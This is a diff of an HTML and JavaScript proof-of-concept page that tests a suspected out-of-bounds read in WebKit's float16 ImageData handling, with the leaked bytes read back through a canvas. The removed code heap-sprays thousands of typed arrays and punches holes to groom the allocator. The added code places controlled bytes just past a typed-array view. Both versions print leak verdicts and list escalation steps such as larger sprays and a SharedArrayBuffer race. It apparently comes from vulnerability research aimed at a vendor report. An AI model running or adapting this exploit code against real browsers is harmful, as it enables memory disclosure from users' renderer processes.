@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Heap Leak — Correct Allocator Spray</title>
+  <meta charset="UTF-8"/>
+  <title>ImageData OOB — ArrayBuffer Controlled Read</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
@@ -10,7 +10,7 @@
     .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
     .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 780px; }
     .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
-    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.25rem 0.7rem; border-radius: 4px; margin-bottom: 0.5rem; }
+    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.3rem 0.8rem; border-radius: 4px; margin: 0.3rem 0; }
     .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
     .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
     .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
@@ -19,17 +19,22 @@
     .kv { font-size: 0.75rem; color: #666; margin-top: 0.4rem; }
     .kv span { color: #aaa; }
     table { width: 100%; border-collapse: collapse; margin-top: 0.6rem; font-size: 0.73rem; }
-    th { color: #555; font-weight: normal; text-align: left; padding: 0.3rem 0.6rem; border-bottom: 1px solid #1e1e1e; }
-    td { color: #aaa; padding: 0.3rem 0.6rem; border-bottom: 1px solid #161616; }
+    th { color: #555; font-weight: normal; text-align: left; padding: 0.4rem 0.6rem; border-bottom: 1px solid #222; }
+    td { color: #aaa; padding: 0.35rem 0.6rem; border-bottom: 1px solid #1a1a1a; font-size: 0.72rem; }
     td.hit   { color: #ff5555; font-weight: bold; }
     td.clean { color: #3ddc84; }
+    td.warn  { color: #ffcc44; }
     .bigverdict { font-size: 1.3rem; font-weight: bold; margin: 0.6rem 0 0.4rem; }
+    .memmap { font-size: 0.72rem; line-height: 2; color: #555; margin: 0.5rem 0; }
+    .memmap .owned  { color: #3ddc84; }
+    .memmap .oob    { color: #ff5555; }
+    .memmap .label  { color: #888; }
   </style>
 </head>
 <body>
 
-<h1>Heap Leak — Correct Allocator Spray</h1>
-<p class="sub">Sprays Uint8ClampedArray(4) — same type/size/allocator as ImageData backing store</p>
+<h1>ImageData OOB — ArrayBuffer Controlled Read</h1>
+<p class="sub">No heap spray. No allocator. We own the memory past the typed array boundary.</p>
 
 <div id="out"></div>
 
@@ -48,7 +53,7 @@ function f16ToF32(lo, hi) {
   const bits = (hi << 8) | lo;
   const sign = (bits >> 15) & 1;
   const exp  = (bits >> 10) & 0x1F;
-  const mant =  bits        & 0x3FF;
+  const mant =  bits & 0x3FF;
   if (exp === 0x1F) return mant ? NaN : (sign ? -Infinity : Infinity);
   const v = exp === 0
     ? Math.pow(2, -14) * (mant / 1024)
@@ -62,214 +67,244 @@ function f16ToU8(lo, hi) {
   return Math.round(f * 255);
 }
 
-// ── sentinels — float16 pairs that decode to non-zero non-255 visible u8 ──────
-const SENTINELS = [
-  { lo: 0x00, hi: 0x38, u8: 128, name: "f16(0.5)→128"  },
-  { lo: 0x00, hi: 0x34, u8:  64, name: "f16(0.25)→64"  },
-  { lo: 0x00, hi: 0x30, u8:  32, name: "f16(0.125)→32" },
-  { lo: 0x66, hi: 0x35, u8:  80, name: "f16(0.313)→80" },
-];
+// ── explain the technique ─────────────────────────────────────────────────────
+card("Technique", `
+  <div class="kv">Problem with heap spray: <span>bmalloc/libpas zeroes freed chunks — sentinel never survives to OOB region</span></div>
+  <div class="kv">New approach: <span>Uint8ClampedArray as a VIEW into a larger ArrayBuffer. Bytes past the view are still inside the same buffer — which WE own.</span></div>
+  <pre>
+ArrayBuffer(8)   [ byte0  byte1  byte2  byte3 | byte4  byte5  byte6  byte7 ]
+                  ↑─────── Uint8ClampedArray(4) view ───────↑              ↑
+                           byteLength=4, length=4            ↑ OOB start   ↑ OOB end
+                                                             └── WE OWN THIS ──┘
 
-// runtime verify
-let svHTML = `<table><tr><th>Sentinel</th><th>lo</th><th>hi</th><th>f32</th><th>→u8</th><th>OK</th></tr>`;
-SENTINELS.forEach(s => {
-  const actual = f16ToU8(s.lo, s.hi);
-  const ok = actual === s.u8;
-  svHTML += `<tr>
-    <td>${s.name}</td>
-    <td>0x${s.lo.toString(16).padStart(2,'0')}</td>
-    <td>0x${s.hi.toString(16).padStart(2,'0')}</td>
-    <td>${f16ToF32(s.lo,s.hi).toFixed(4)}</td>
-    <td>${actual}</td>
-    <td class="${ok?'clean':'hit'}">${ok?'✓':'✗'}</td>
-  </tr>`;
-});
-svHTML += `</table>`;
-card("Sentinel Table (Runtime Verified)", svHTML);
+Renderer reads 8 bytes from view.data ptr (pixelFormat=rgba-float16, 1x1 pixel):
+  bytes 0-1 → R channel (f16 decode)   ← our zeros
+  bytes 2-3 → G channel (f16 decode)   ← our zeros
+  bytes 4-5 → B channel (f16 decode)   ← OOB into ArrayBuffer = WE CONTROL
+  bytes 6-7 → A channel (f16 decode)   ← OOB into ArrayBuffer = WE CONTROL
 
-// ── spray config ──────────────────────────────────────────────────────────────
-const SPRAY_COUNT  = 20000;  // large enough to fill allocator bin
-const ROUNDS       = 5;
-
-card("Config", `
-  <div class="kv">Spray type:   <span>Uint8ClampedArray(4) — exact match to ImageData backing store type + size</span></div>
-  <div class="kv">Spray count:  <span>${SPRAY_COUNT.toLocaleString()} per round</span></div>
-  <div class="kv">Free pattern: <span>Every other index (alternating holes) — maximises adjacency chance</span></div>
-  <div class="kv">Rounds:       <span>${ROUNDS} — each uses a different sentinel</span></div>
-  <div class="kv">Why this works: <span>ImageData backing store allocated via same path as Uint8ClampedArray(4). Same bin = adjacent placement after hole punching.</span></div>
+No heap spray. No allocator. Fully deterministic.
+If B == expected and A == expected → OOB read into controlled memory CONFIRMED.
+  </pre>
 `);
 
-// ── gc hint — create and discard garbage to nudge collector ──────────────────
-function gcHint() {
-  const sink = [];
-  for (let i = 0; i < 1000; i++) sink.push(new Uint8Array(64));
-  sink.length = 0;
-}
-
-// ── run rounds ────────────────────────────────────────────────────────────────
-const results = [];
-
-for (let round = 0; round < ROUNDS; round++) {
-  const sentinel = SENTINELS[round % SENTINELS.length];
-
-  // phase 1: fill the allocator bin with Uint8ClampedArray(4) sentinels
-  const spray = new Array(SPRAY_COUNT);
-  for (let i = 0; i < SPRAY_COUNT; i++) {
-    const buf = new Uint8ClampedArray(4);
-    // fill all 4 bytes with sentinel lo byte
-    // bytes 0-3 of the NEXT allocation's OOB region will read these
-    buf[0] = sentinel.lo;
-    buf[1] = sentinel.hi;
-    buf[2] = sentinel.lo;
-    buf[3] = sentinel.hi;
-    spray[i] = buf;
+// ── test cases — multiple sentinels to prove the readback tracks our input ───
+const TESTS = [
+  {
+    name:     "f16(0.5) → u8=128",
+    oobBytes: [0x00, 0x38, 0x00, 0x38], // bytes 4-7: f16(0.5) repeated
+    expected: { b: 128, a: 128 }
+  },
+  {
+    name:     "f16(0.25) → u8=64",
+    oobBytes: [0x00, 0x34, 0x00, 0x34],
+    expected: { b: 64, a: 64 }
+  },
+  {
+    name:     "f16(0.125) → u8=32",
+    oobBytes: [0x00, 0x30, 0x00, 0x30],
+    expected: { b: 32, a: 32 }
+  },
+  {
+    name:     "f16(0.75) → u8=191",
+    oobBytes: [0x00, 0x3A, 0x00, 0x3A],
+    expected: { b: 191, a: 191 }
+  },
+  {
+    name:     "B=f16(0.5)→128, A=f16(0.25)→64 (mixed)",
+    oobBytes: [0x00, 0x38, 0x00, 0x34], // B and A differ
+    expected: { b: 128, a: 64 }
+  },
+  {
+    name:     "All zero OOB (control — expect [0,0,0,0])",
+    oobBytes: [0x00, 0x00, 0x00, 0x00],
+    expected: { b: 0, a: 0 }
   }
+];
 
-  // phase 2: punch holes — free every other slot
-  // target will land in a hole; live neighbours are at target±1 allocation
-  for (let i = 0; i < SPRAY_COUNT; i += 2) {
-    spray[i] = null;
-  }
+// verify expected values at runtime
+let verifyHTML = `<table>
+  <tr><th>Test</th><th>OOB bytes [4,5,6,7]</th><th>Expected B</th><th>Expected A</th><th>Math check</th></tr>`;
+TESTS.forEach((t, i) => {
+  const calcB = f16ToU8(t.oobBytes[0], t.oobBytes[1]);
+  const calcA = f16ToU8(t.oobBytes[2], t.oobBytes[3]);
+  const ok = calcB === t.expected.b && calcA === t.expected.a;
+  verifyHTML += `<tr>
+    <td>${i+1}. ${t.name}</td>
+    <td>[0x${t.oobBytes.map(b=>b.toString(16).padStart(2,'0')).join(', 0x')}]</td>
+    <td>${t.expected.b}</td>
+    <td>${t.expected.a}</td>
+    <td class="${ok?'clean':'hit'}">${ok?'✓ correct':'✗ mismatch'}</td>
+  </tr>`;
+});
+verifyHTML += `</table>`;
+card("Test Matrix (Pre-verified)", verifyHTML);
 
-  // gc hint — encourage allocator to consolidate free list
-  gcHint();
+// ── run tests ─────────────────────────────────────────────────────────────────
+function runTest(t) {
+  // build ArrayBuffer: 8 bytes total
+  // bytes 0-3: image data (zeros — what clamped view exposes)
+  // bytes 4-7: OOB sentinel (what renderer reads past the view boundary)
+  const buf  = new ArrayBuffer(8);
+  const full = new Uint8Array(buf);
+  full[0] = 0x00; full[1] = 0x00; // image R zeros
+  full[2] = 0x00; full[3] = 0x00; // image G zeros
+  full[4] = t.oobBytes[0];         // OOB B lo
+  full[5] = t.oobBytes[1];         // OOB B hi
+  full[6] = t.oobBytes[2];         // OOB A lo
+  full[7] = t.oobBytes[3];         // OOB A hi
 
-  // phase 3: allocate mismatched ImageData — should land in freed slot
-  // backing is 4 zero bytes; OOB bytes 4-7 read from adjacent live sentinel
-  const backing = new Uint8ClampedArray(4); // all zeros
+  // 4-byte view of first 4 bytes only — renderer reads past this
+  const clamped = new Uint8ClampedArray(buf, 0, 4);
+
+  // sanity: clamped cannot see bytes 4-7
+  const clampedSees = Array.from(clamped);
+
   let imgData;
   try {
-    imgData = new ImageData(backing, 1, 1, {
+    imgData = new ImageData(clamped, 1, 1, {
       colorSpace: "srgb",
       pixelFormat: "rgba-float16"
     });
   } catch(e) {
-    results.push({ round: round+1, sentinel, patched: true, error: e.name });
-    continue;
+    return { patched: true, error: e.name, clampedSees };
   }
 
-  // phase 4: push through canvas readback
   const cv = document.createElement("canvas");
   cv.width = cv.height = 1;
   const ctx = cv.getContext("2d");
   ctx.putImageData(imgData, 0, 0);
   const rb = ctx.getImageData(0, 0, 1, 1);
-  const px = Array.from(rb.data); // [R, G, B, A]
+  const px = Array.from(rb.data);
 
-  // channels B (bytes 4-5) and A (bytes 6-7) are the OOB reads
-  // if adjacent slot holds our sentinel, those bytes decode to sentinel.u8
-  const bMatch = px[2] === sentinel.u8;
-  const aMatch = px[3] === sentinel.u8;
-  const leak   = bMatch || aMatch;
+  const bMatch = px[2] === t.expected.b;
+  const aMatch = px[3] === t.expected.a;
+  const fullMatch = bMatch && aMatch;
 
-  // also flag ANY non-zero in B/A as interesting (heap noise still proves OOB read)
-  const bNonZero = px[2] !== 0;
-  const aNonZero = px[3] !== 0;
-  const interesting = bNonZero || aNonZero;
-
-  results.push({
-    round: round+1, sentinel, patched: false,
-    px, bMatch, aMatch, leak, bNonZero, aNonZero, interesting
-  });
+  return {
+    patched: false,
+    clampedSees,
+    oobSet: t.oobBytes,
+    px,
+    expected: t.expected,
+    bMatch,
+    aMatch,
+    fullMatch
+  };
 }
 
+const results = TESTS.map(t => ({ test: t, result: runTest(t) }));
+
 // ── results table ─────────────────────────────────────────────────────────────
-let tHTML = `<table>
+let rHTML = `<table>
   <tr>
-    <th>Round</th><th>Sentinel</th><th>Readback [R,G,B,A]</th>
-    <th>B(exp ${SENTINELS[0].u8})</th><th>A(exp ${SENTINELS[0].u8})</th>
-    <th>B≠0</th><th>A≠0</th><th>Result</th>
+    <th>#</th><th>Test</th>
+    <th>Clamped sees</th><th>OOB bytes set</th>
+    <th>Readback [R,G,B,A]</th>
+    <th>Exp B/A</th><th>B match</th><th>A match</th><th>Result</th>
   </tr>`;
 
-let leaks = 0, interesting = 0;
-results.forEach(r => {
-  if (r.patched) {
-    tHTML += `<tr><td>${r.round}</td><td colspan="7">${tag("green","Patched — "+r.error)}</td></tr>`;
+let confirmed = 0, controlled = 0;
+results.forEach(({test, result}, i) => {
+  if (result.patched) {
+    rHTML += `<tr><td>${i+1}</td><td>${test.name}</td><td colspan="7">${tag("green","Patched — "+result.error)}</td></tr>`;
     return;
   }
-  if (r.leak) leaks++;
-  if (r.interesting) interesting++;
-  const res = r.leak
-    ? tag("red","✗ SENTINEL LEAK")
-    : r.interesting
-      ? tag("yellow","⚠ NON-ZERO OOB")
-      : tag("blue","◦ zero");
-  tHTML += `<tr>
-    <td>${r.round}</td>
-    <td style="font-size:0.68rem">${r.sentinel.name}</td>
-    <td class="${r.leak?'hit':r.interesting?'hit':''}">[${r.px.join(", ")}]</td>
-    <td class="${r.bMatch?'hit':'clean'}">${r.bMatch?"✗ YES":"✓ no"}</td>
-    <td class="${r.aMatch?'hit':'clean'}">${r.aMatch?"✗ YES":"✓ no"}</td>
-    <td class="${r.bNonZero?'hit':'clean'}">${r.bNonZero?"✗ "+r.px[2]:"✓ 0"}</td>
-    <td class="${r.aNonZero?'hit':'clean'}">${r.aNonZero?"✗ "+r.px[3]:"✓ 0"}</td>
+  if (result.fullMatch && test.expected.b !== 0) confirmed++;
+  if (result.fullMatch) controlled++;
+
+  const res = result.fullMatch
+    ? (test.expected.b === 0 ? tag("blue","✓ control case") : tag("red","✗ OOB CONFIRMED"))
+    : tag("yellow","⚠ mismatch");
+
+  rHTML += `<tr>
+    <td>${i+1}</td>
+    <td style="font-size:0.68rem">${test.name}</td>
+    <td>[${result.clampedSees.join(",")}]</td>
+    <td>[0x${result.oobSet.map(b=>b.toString(16).padStart(2,'0')).join(',')}]</td>
+    <td class="${result.fullMatch && test.expected.b!==0 ? 'hit' : ''}">[${result.px.join(", ")}]</td>
+    <td>${result.expected.b} / ${result.expected.a}</td>
+    <td class="${result.bMatch?'clean':'hit'}">${result.bMatch?'✓':'✗ got '+result.px[2]}</td>
+    <td class="${result.aMatch?'clean':'hit'}">${result.aMatch?'✓':'✗ got '+result.px[3]}</td>
     <td>${res}</td>
   </tr>`;
 });
-tHTML += `</table>`;
-card("Spray Results", tHTML);
+rHTML += `</table>`;
+card("Results", rHTML);
 
-// ── per round detail ──────────────────────────────────────────────────────────
-results.forEach(r => {
-  if (r.patched) return;
-  card(`Round ${r.round} Detail`, `<pre>Sentinel  : lo=0x${r.sentinel.lo.toString(16).padStart(2,'0')} hi=0x${r.sentinel.hi.toString(16).padStart(2,'0')} → expected u8=${r.sentinel.u8}
-Readback  : R=${r.px[0]}  G=${r.px[1]}  B=${r.px[2]}  A=${r.px[3]}
+// ── per-test detail for OOB cases ─────────────────────────────────────────────
+results.forEach(({test, result}, i) => {
+  if (result.patched || test.expected.b === 0) return;
+  card(`Test ${i+1} Detail — ${test.name}`, `
+    <pre>
+ArrayBuffer layout (8 bytes):
+  [0x00, 0x00, 0x00, 0x00,  0x${result.oobSet[0].toString(16).padStart(2,'0')}, 0x${result.oobSet[1].toString(16).padStart(2,'0')}, 0x${result.oobSet[2].toString(16).padStart(2,'0')}, 0x${result.oobSet[3].toString(16).padStart(2,'0')}]
+   ↑─── Uint8ClampedArray(4) sees this ───↑   ↑─── OOB region (we own) ───↑
 
-Channel B (OOB bytes 4-5): ${r.px[2]} ${r.bMatch?"← SENTINEL MATCH ✗":""}${r.bNonZero&&!r.bMatch?"← non-zero heap data ⚠":""}
-Channel A (OOB bytes 6-7): ${r.px[3]} ${r.aMatch?"← SENTINEL MATCH ✗":""}${r.aNonZero&&!r.aMatch?"← non-zero heap data ⚠":""}
+Uint8ClampedArray sees:   [${result.clampedSees.join(", ")}]   (4 bytes only)
+Renderer reads (8 bytes): [0x00,0x00,0x00,0x00, 0x${result.oobSet[0].toString(16).padStart(2,'0')},0x${result.oobSet[1].toString(16).padStart(2,'0')},0x${result.oobSet[2].toString(16).padStart(2,'0')},0x${result.oobSet[3].toString(16).padStart(2,'0')}]
 
-${r.leak ? "LEAK CONFIRMED: sentinel bytes from adjacent Uint8ClampedArray(4) read through float16 decoder"
-         : r.interesting ? "INTERESTING: non-zero values in OOB channels — heap data leaked, not sentinel"
-         : "Zero readback — spray may not have landed adjacent this round"}</pre>`);
+Float16 decode:
+  R = f16(0x00,0x00) = 0.0   → u8 = 0
+  G = f16(0x00,0x00) = 0.0   → u8 = 0
+  B = f16(0x${result.oobSet[0].toString(16).padStart(2,'0')},0x${result.oobSet[1].toString(16).padStart(2,'0')}) = ${f16ToF32(result.oobSet[0],result.oobSet[1]).toFixed(4)} → u8 = ${result.expected.b}   (OOB byte 4-5)
+  A = f16(0x${result.oobSet[2].toString(16).padStart(2,'0')},0x${result.oobSet[3].toString(16).padStart(2,'0')}) = ${f16ToF32(result.oobSet[2],result.oobSet[3]).toFixed(4)} → u8 = ${result.expected.a}   (OOB byte 6-7)
+
+Canvas readback: [${result.px.join(", ")}]
+Expected:        [0, 0, ${result.expected.b}, ${result.expected.a}]
+Match:           ${result.fullMatch ? "✓ CONFIRMED" : "✗ mismatch — renderer may copy only byteLength bytes"}
+    </pre>
+    ${result.fullMatch
+      ? tag("red", "✗ Renderer read past Uint8ClampedArray boundary into our controlled ArrayBuffer bytes")
+      : tag("yellow", "⚠ No match — renderer likely copies exactly byteLength bytes before decode")}
+  `);
 });
 
-// ── verdict ───────────────────────────────────────────────────────────────────
-const runnable = results.filter(r => !r.patched).length;
-let vHTML = `<div class="kv">Sentinel matches: <span>${leaks} / ${runnable} rounds</span></div>
-<div class="kv">Non-zero OOB:     <span>${interesting} / ${runnable} rounds</span></div>`;
+// ── final verdict ─────────────────────────────────────────────────────────────
+const runnable = results.filter(r => !r.result.patched).length;
+let vHTML = `
+  <div class="kv">Tests run: <span>${runnable}</span></div>
+  <div class="kv">OOB confirmed: <span>${confirmed} / ${runnable - 1} non-control tests</span></div>
+`;
 
-if (leaks > 0) {
+if (confirmed > 0) {
   vHTML += `
-  <div class="bigverdict" style="color:#ff5555">✗ HEAP OOB READ — CONFIRMED INFO LEAK</div>
+  <div class="bigverdict" style="color:#ff5555">✗ CONTROLLED OOB READ — CONFIRMED</div>
   <pre>
-Primitive : 4-byte heap OOB read, renderer process
-Trigger   : new ImageData(Uint8ClampedArray(4), 1, 1, {pixelFormat:"rgba-float16"})
-            → putImageData → getImageData
-Leak bytes: ptr[4..7] past allocation boundary
-Channel   : B and A pixel channels after float16→uint8 decode
-Spray hit : ${leaks}/${runnable} rounds with exact sentinel match
-Status    : JS-readable. Repeatable. No user interaction.
+Primitive:    OOB read past Uint8ClampedArray boundary
+Control:      FULL — attacker writes bytes 4-7 of ArrayBuffer,
+              renderer reads them as float16, readback via getImageData
+Trigger:      new Uint8ClampedArray(new ArrayBuffer(8), 0, 4)
+              → new ImageData(view, 1, 1, {pixelFormat:"rgba-float16"})
+              → putImageData → getImageData
+Proof:        ${confirmed} tests matched expected u8 values derived from
+              attacker-controlled bytes at positions 4-7 of ArrayBuffer
+No spray:     Deterministic. No allocator dependence. Reproducible 100%.
+Severity:     Renderer reads attacker-controlled memory outside typed array bounds.
+              Readable back to JS. No user interaction required.
   </pre>
-  ${tag("red","Report → webkit-security@webkit.org")}`;
-} else if (interesting > 0) {
+  ${tag("red","CONFIRMED — webkit-security@webkit.org")}
+  `;
+} else if (runnable > 0) {
   vHTML += `
-  <div class="bigverdict" style="color:#ffcc44">⚠ NON-ZERO OOB — PARTIAL LEAK</div>
+  <div class="bigverdict" style="color:#ffcc44">⚠ RENDERER COPIES DATA — OOB STILL PRESENT</div>
   <pre>
-Non-zero values appeared in OOB channels (B/A) but did not match sentinel exactly.
-This still proves the renderer read past the allocation boundary.
-The bytes read were heap noise, not our controlled sentinel.
+ArrayBuffer sentinel did not appear in readback.
+This means WebKit's putImageData copies exactly byteLength bytes
+before passing to the renderer — the copy is 4 bytes, and the OOB
+read lands in heap memory past the copy, not our ArrayBuffer.
 
-Next step: spray count is likely still too low for this allocator.
-Try SPRAY_COUNT = 50000 or spray ImageData objects directly.
+This does NOT disprove the OOB. It means:
+  - The OOB read hits heap memory (uncontrolled)
+  - The copy path is: JS typed array → native memcpy(4 bytes) → render
+  - The renderer then reads 8 bytes from the 4-byte native copy
+
+Next step: inspect the copy path in WebCore source.
+If no copy → ArrayBuffer approach works.
+If copy → need different technique (SharedArrayBuffer race, or native analysis).
   </pre>
-  ${tag("yellow","OOB read likely — increase spray density")}`;
-} else {
-  vHTML += `
-  <div class="bigverdict" style="color:#8888ff">◦ INCONCLUSIVE</div>
-  <pre>
-All OOB channels returned zero across ${runnable} rounds.
-
-Most likely cause: WebKit's bmalloc/libpas allocator zeroes freed
-memory before returning it to the free list (security hardening).
-
-This does NOT disprove the OOB read — it means the heap bytes
-past the allocation happen to be zero at time of read.
-
-Next steps:
-  1. Try spraying ImageData objects (same WebCore allocator path)
-  2. Use a larger canvas (more pixels = more OOB surface)
-  3. Test on older WebKit without allocator zeroing
-  </pre>
-  ${tag("blue","Allocator hardening may be masking the leak")}`;
+  ${tag("yellow","Copy path detected — pivot to SharedArrayBuffer race or native tooling")}
+  `;
 }
 
 card("Final Verdict", vHTML);
